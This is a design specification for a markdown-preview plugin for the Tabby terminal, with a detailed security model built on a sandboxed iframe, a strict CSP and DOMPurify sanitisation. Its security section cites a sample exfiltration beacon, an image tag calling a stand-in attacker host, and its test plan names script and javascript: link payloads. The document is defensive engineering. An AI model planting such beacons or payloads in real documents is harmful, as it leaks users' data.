# tabby-markdown-preview — Design

**Date:** 2026-06-16
**Status:** Approved design, revised after multi-model review (Opus 4.8 + Codex gpt-5.5)

## Summary

A Tabby terminal plugin that adds a toolbar button. Clicking it opens a file
browser rooted at the **active terminal's current working directory**. The user
navigates folders and clicks a `.md` file, which renders in a **new Tabby tab**
styled like VSCode's dark markdown preview.

Target: the Tabby terminal emulator (https://github.com/Eugeny/tabby), an
Electron + Angular application. Plugin written in TypeScript, built with the
standard Tabby plugin toolchain (webpack, UMD output), distributed as an npm
package named `tabby-markdown-preview`.

> **Security framing (important):** Tabby's renderer runs with
> `nodeIntegration: true` and `contextIsolation: false` (verified in
> `app/lib/window.ts`). Therefore *any* HTML-sanitizer bypass in rendered
> markdown is a **remote-code-execution** risk, not merely XSS — because the
> markdown content comes from arbitrary local files the user opens. The design
> treats the rendered document as **untrusted** and isolates it (see
> [Security model](#security-model)).

## Confirmed decisions

| Decision | Choice |
|----------|--------|
| Target app | Tabby terminal emulator (Eugeny/tabby) |
| Language | TypeScript (compiles to JS) |
| Trigger | Toolbar button → file browser at terminal's cwd |
| Preview surface | New Tabby tab |
| Tab-opening API | `AppService.openNewTab({ type, inputs })` (wrapped/splittable) |
| Rendering isolation | **Sandboxed `<iframe srcdoc>` + strict CSP**, content sanitized with DOMPurify |
| Rendering pipeline | `marked` + `marked-highlight` (highlight.js) + `DOMPurify` + GitHub-dark CSS |
| Local images | Relative-only (under the `.md` file's directory), via `url.pathToFileURL` |
| Link handling | Intercept clicks; allow `http(s)`/`mailto`; open via `shell.openExternal`; block all else |
| Extra triggers | None (toolbar button only — no context menu in v1) |
| Tab reuse | Always open a new tab per file |

## Architecture

The plugin is a single default-exported Angular `NgModule` (`index.ts`) that
registers providers and declares components. Four focused units:

### 1. `MarkdownToolbarButtonProvider` (`extends ToolbarButtonProvider`)
Provides the toolbar button. On `click`:
1. Resolve the working directory via `CwdResolver`.
2. Open the `FileBrowserComponent` modal at that directory and await its result.
3. On a returned file path, `appService.openNewTab({ type: MarkdownPreviewTabComponent, inputs: { filePath } })`.

API notes (verified against current Tabby source):
- `ToolbarButton.icon` is a **raw SVG string**, not an icon name. Ship an inline
  SVG (markdown/file glyph); do not rely on a named icon.
- Register with `{ provide: ToolbarButtonProvider, useClass: ..., multi: true }`.
- Use `openNewTab` (not `openNewTabRaw`): `openNewTabRaw` deliberately skips
  wrapping the tab in a `SplitTabComponent`, so the preview tab would not be
  splittable/arrangeable like normal tabs. `openNewTab` is the idiomatic choice.

### 2. `CwdResolver`
Kept as its own unit because it has real branching logic worth unit-testing.
Resolution order:
1. `const tab = appService.activeTab`.
2. If `tab instanceof BaseTerminalTabComponent` **and** the session is a *local*
   terminal **and** `tab.session?.supportsWorkingDirectory()` is true →
   `const cwd = await tab.session.getWorkingDirectory()`.
3. Validate `cwd` is non-null and exists (`fs.promises.access`). The local
   session returns `null` fairly often (no OSC-7, PID lookup fails), so the next
   step is the **common** path, not a rare edge case.
4. Otherwise fall back to `os.homedir()`.

**Remote/SSH sessions:** a remote shell may report a path like `/home/foo` that
does *not* exist locally — browsing it would be misleading. v1 only trusts the
cwd of **local** terminal sessions; for SSH/remote (or any non-terminal active
tab) it falls back to `$HOME` and the file browser shows a small notice
("Showing home directory — remote working directories aren't supported yet").

### 3. `FileBrowserComponent` (NgbModal dialog)
- Lists directory entries with `fs.promises.readdir(dir, { withFileTypes: true })`.
- **Filter:** directories first (alphabetical), then `.md`/`.markdown` files
  (alphabetical). Non-markdown files are **not shown** in v1 (simpler than the
  earlier "dimmed but visible" idea; a show-all toggle is a future enhancement).
- Navigation: breadcrumb of the current path; a `..` entry to go up; click a
  folder to descend.
- **Symlinks:** resolve a selected entry with `fs.promises.realpath` and `stat`
  it (with loop/error handling) to classify dir-vs-file correctly; broken or
  looping symlinks are shown non-clickable.
- **Result contract:** selecting a markdown file resolves its absolute (real)
  path and calls `activeModal.close(path)`. Dismiss/Escape rejects → the button
  provider treats that as a no-op.

### 4. `MarkdownPreviewTabComponent` (`extends BaseTabComponent`)
- Receives `filePath` as an input (`Object.assign`ed from `inputs`).
- Reads the file as a `Buffer`, handles a UTF-8 BOM, decodes UTF-8 (clean error
  message on invalid encoding rather than silent mojibake).
- Enforces a **size cap** (warn/refuse above ~5–10 MB) before rendering, to
  avoid freezing the UI thread on huge or pathological files.
- Renders markdown → sanitized HTML, then displays it **inside a sandboxed
  `<iframe>`** (see Security model). Tab title = the file's basename via
  `setTitle()`.
- Provides a **Reload** action that re-reads and re-renders the file.
- The component itself never inserts raw HTML into the host Angular DOM; only the
  iframe receives the (sanitized) document. Any render-failure fallback shows the
  raw source as **escaped text via Angular interpolation / DOM text nodes**,
  never by re-inserting a string.

### Data flow
```
toolbar button click
  → CwdResolver.resolve()                     (local terminal cwd, validated, or $HOME)
  → open FileBrowserComponent(dir)            (fs.readdir, navigate, markdown-only)
  → user clicks a .md file → realpath
  → appService.openNewTab({
        type: MarkdownPreviewTabComponent,
        inputs: { filePath }
    })
  → tab reads file (Buffer→UTF-8, size cap) → render → sanitize → iframe srcdoc
```

## Security model

The rendered document is untrusted; the renderer is Node-privileged. Defense in
depth, in order of importance:

1. **Sandboxed iframe.** The sanitized HTML is delivered via
   `<iframe sandbox="allow-same-origin" srcdoc="...">` (no `allow-scripts`),
   inside the preview component. This is the realistic isolation boundary —
   Electron `<webview>` is unavailable to a plugin (`webviewTag` defaults off and
   a plugin can't change `webPreferences`). A sanitizer bypass is thereby
   downgraded from RCE to contained, scriptless, in-frame breakage.
2. **Strict CSP** injected into the iframe document:
   `default-src 'none'; script-src 'none'; img-src 'self' file: data:;
   style-src 'unsafe-inline'; font-src file: data:`. This also closes the
   remote-image exfiltration channel (a malicious `<img src="https://attacker/?leak">`
   beacon) for free.
3. **DOMPurify** with a tightened config: `{ USE_PROFILES: { html: true } }`,
   restricted URI schemes (do **not** widen `ALLOWED_URI_REGEXP`), inline
   `style` forbidden. Pin **DOMPurify ≥ 3.2.7** (avoid 2.x) and keep
   marked/highlight.js current; add `npm audit` to CI.
4. **Link handling.** An `afterSanitizeAttributes` hook forces
   `rel="noopener noreferrer"`. Anchor clicks are intercepted
   (`preventDefault()`), the scheme is validated as `http`/`https`/`mailto`
   only, and the URL is opened via `shell.openExternal`. Everything else
   (`javascript:`, `file:`, custom protocols, in-app navigation) is blocked.
5. **Image rewriting.** Relative image `src` values are resolved against the
   `.md` file's directory with `path.resolve` and converted with
   `url.pathToFileURL()` (never string concatenation — handles spaces, `#`, `%`,
   unicode, Windows drive letters). Absolute `file://`, UNC, and remote images
   are blocked in v1. Rewriting happens as part of producing the final document,
   consistent with sanitization (no post-sanitize mutation that could void it).

## Rendering pipeline

1. `marked` converts markdown → HTML.
2. `marked-highlight` (wrapping `highlight.js`) highlights fenced code blocks.
   **Note:** marked removed the old top-level `highlight` option in v8 — the
   `marked-highlight` extension is the supported path. Restrict/auto-detect
   languages rather than honoring arbitrary fence hints (ReDoS surface).
3. `DOMPurify` sanitizes (config above).
4. Image/link rewriting per the Security model.
5. The result is embedded as the iframe `srcdoc` together with the CSP `<meta>`
   and a GitHub-dark stylesheet, giving the VSCode-like appearance.

## Error handling

| Condition | Behavior |
|-----------|----------|
| No active terminal / non-terminal tab / cwd unknown | File browser opens at `$HOME` with a notice |
| Remote/SSH session cwd | Treated as unsupported → `$HOME` + notice |
| Directory unreadable (permissions) | Inline error in browser; stay at previous dir |
| Broken / looping symlink | Entry shown non-clickable |
| File too large (> cap) | Preview tab shows a "file too large to preview" message |
| Non-UTF8 / invalid encoding | Preview tab shows a clean decode-error message |
| File unreadable | Preview tab shows the read error message |
| Render failure | Fall back to escaped raw text (DOM text nodes, not string insertion) |
| Untrusted HTML / scripts in markdown | Sanitized + sandboxed iframe + CSP |

## Scope

**In scope (v1):**
- Local terminal sessions only (for cwd).
- Read-only preview.
- Markdown-only file listing.
- Relative-only local images.
- Manual Reload button.
- A new (splittable) tab per opened file.

**Out of scope (future enhancements):**
- Live auto-reload on file change (`fs.watch`).
- Remote / SFTP file previewing and remote cwd.
- In-place editing.
- Show-all-files toggle in the browser.
- Right-click context-menu trigger.
- Absolute/remote images.

## Testing strategy

- **Unit tests (Jest)** for the pure logic:
  - `markdownRenderer` (markdown → sanitized HTML): correct rendering, code-block
    highlighting, and **security cases** — inline `<script>`, `javascript:` and
    `file:` hrefs, relative vs absolute vs encoded vs Windows image paths, remote
    `<img>`. Caveat: DOMPurify runs against jsdom in tests, and cure53 warns
    jsdom-context sanitization can differ from the real browser/Electron DOM, so
    these assertions verify our wiring, not an equivalence guarantee — the iframe
    + CSP remain the primary defense.
  - `CwdResolver` branching: terminal-tab check, local-vs-remote,
    `supportsWorkingDirectory`, `null` handling, `$HOME` fallback.
  - directory listing/sort/filter and symlink classification.
- **Manual integration testing** in a Tabby dev instance: toolbar button appears,
  browser opens at the terminal cwd, navigation works, preview renders with dark
  styling, links open externally, large/invalid files degrade gracefully.

## Project layout (anticipated)

```
tabby-markdown-preview/
├── package.json
├── tsconfig.json
├── webpack.config.js       # delegates to Tabby's webpack.plugin.config.mjs, UMD output
├── src/
│   ├── index.ts            # NgModule + provider registration
│   ├── buttonProvider.ts   # MarkdownToolbarButtonProvider
│   ├── cwdResolver.ts      # CwdResolver
│   ├── fileBrowser.component.ts / .pug / .scss
│   ├── previewTab.component.ts / .pug / .scss   # hosts the sandboxed iframe
│   └── markdownRenderer.ts # pure render+sanitize function (unit-tested)
└── test/                   # Jest unit tests
```

### Dependencies
- **peerDependencies (externalized by Tabby's webpack):** `tabby-core`,
  `tabby-terminal`, `@angular/core` & friends, `rxjs`, `@ng-bootstrap/ng-bootstrap`.
- **dependencies (bundled into the UMD output):** `marked`, `marked-highlight`,
  `highlight.js`, `dompurify` (≥ 3.2.7). Pin versions.
- `"keywords": ["tabby-plugin"]` (required for Tabby to discover the plugin).

## Open items / preflight

- **Tabby version preflight:** before/at build time, verify the installed
  `tabby-core` / `tabby-terminal` versions expose the cited APIs
  (`openNewTab`, `ToolbarButtonProvider`, `BaseTerminalTabComponent`,
  `session.supportsWorkingDirectory()` / `getWorkingDirectory()`,
  `BaseTabComponent`). Record the target version in `package.json` peerDeps.
- Confirm the GitHub-dark stylesheet source/licensing for bundling.

## Review provenance

This spec was revised after independent design reviews by an Opus 4.8 subagent
and Codex (gpt-5.5), both verified against current Tabby source. Key adopted
changes: sandboxed-iframe + CSP rendering isolation (the Node-integration RCE
concern), `openNewTab` over `openNewTabRaw`, `supportsWorkingDirectory()`
guarding, explicit link/image handling, `marked-highlight` (marked v8 API),
size cap, symlink/UTF-8 handling, and the corrected dependency plan.
